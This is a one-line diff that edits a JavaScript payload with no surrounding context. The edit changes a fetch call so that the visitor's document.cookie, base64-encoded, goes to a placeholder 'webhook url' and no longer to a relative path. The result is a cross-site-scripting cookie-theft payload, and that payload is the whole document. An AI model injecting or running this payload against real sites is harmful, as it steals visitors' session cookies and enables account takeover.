@@ -1,1 +1,1 @@
-fetch("/foo?"+window.btoa(document.cookie))
+fetch("webhook url/foo?"+window.btoa(document.cookie))
